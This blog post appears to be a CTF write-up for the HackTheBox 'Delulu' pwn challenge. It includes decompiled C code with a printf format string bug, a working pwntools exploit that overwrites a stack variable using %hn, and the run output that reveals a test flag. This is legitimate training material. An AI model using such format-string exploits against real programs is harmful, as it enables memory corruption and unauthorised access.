---
layout: post
title: "pwn delulu"
date: 2024-03-14 17:18:49 -0700
categories: ctfs
description: The "Delulu" challenge in the pwn category involves exploiting a vulnerability in the printf function, leading to arbitrary memory overwrite. By identifying the lack of type declaration in printf and leveraging the `%n` format specifier, participants can manipulate memory to achieve their objective, such as overwriting a variable value.
parent: HackTheBox - Apocalypse '24
grand_parent: CTF Events
event: "hackthebox-apocalypse"
tags:
- "pwn"
- "printf vulnerability"
- "arbitrary memory overwrite"
- "exploitation"
- "format string vulnerability"
---



## Delulu - Pwn Challenge
The "Delulu" challenge, while considered easy, presented a significant hurdle to me due to its exploitation of the printf function's vulnerability. Participants initially identify that printf is used without specifying the output type, leading to a format string vulnerability where raw input data is directly dumped onto the screen. Watching [CryptoCat](https://www.youtube.com/playlist?list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94) youtube on Pwn CTF challenges, and reading the suggested article by [Alexandre Cheron](https://axcheron.github.io/exploit-101-format-strings/) REALLY helped me grok enough information to finally craft this payload.

### Exploiting the Format String Vulnerability:
Upon discovering the lack of type declaration in printf, participants experiment with various format specifiers, including `%p`, to manipulate memory and leak values from the stack. By iterating through these values, participants eventually identify the variable storing a value to check against "0x1337beef."

```c

undefined8 main(void)

{
  long in_FS_OFFSET;
  long local_48;
  long *local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_48 = 0x1337babe; //<-- Variable holding on the target value
  local_40 = &local_48;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  read(0,&local_38,0x1f); //<-- My input, 31 characters long
  printf("\n[!] Checking.. "); 
  printf((char *)&local_38); //<-- Vulnerable function that allows me to leak addresses and manipulate memory
  if (local_48 == 0x1337beef) { //<-- Where the check against local_48 is made to see if 0x1337babe will equal 0x1337beef
    delulu(); //<-- The winning condition
  }
  else {
    error("ALERT ALERT ALERT ALERT\n");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

### Crafting the Payload:
To manipulate memory and overwrite the variable, participants craft a payload utilizing the `%hn` format specifier. This specifier allows them to specify the number of characters written by printf and thus control the memory write operation. Through research and understanding gained from online resources, participants create a payload to overwrite the variable with the desired value, "0x1337beef."

```python
def execute():
    io = start()

    beef = 0xbeef # We only have to change the second half
    pointer = (0x7fffffffad80+6).to_bytes(length=6, byteorder="little") # Found this in gdb using `x/1000x $sp` and searching for my value AFTER I had a padded output, as this value moved around on me
    position = 7 # Found this by iterating through all the first 100 pointers with %p, however originally I was off-by-one on which value to send.
    
    payload = pointer # The memory location to overwrite
    payload += b'%' # printf separator
    payload += str(beef-6).encode() # 
    payload += b'x%' # Tells printf to print len(char) and not the pointer of len(char)
    payload += str(position).encode()
    payload += b'$hn'

    print(len(payload), payload)
    io.recvuntil(b'>>')
    io.sendline(payload)

    io.interactive()

execute()
```

```sh
11:44:18] tokugero :: pangolin  ➜  pwn/delulu/challenge » python pwntools.py 
[+] Starting local process './delulu': pid 542078
18 b'\x86\xad\xff\xff\xff\x7f%48873x%7$hn'
[*] Switching to interactive mode
[!] Checking.. \x86\xad\xff\xff\xff\x7f                                                                                                        <SNIPPING 0xbeef AMOUNT OF SPACES>
You managed to deceive the robot, here's your new identity: HTB{f4k3_fl4g_4_t35t1ng}
[*] Got EOF while reading in interactive
```

### Conclusion:
The "Delulu" challenge underscores the importance of understanding printf vulnerabilities and format string attacks in pwn challenges. By leveraging the `%hn` format specifier and crafting a precise payload, participants can manipulate memory and achieve their objectives. This experience highlights the significance of thorough research and experimentation in exploiting vulnerabilities effectively.
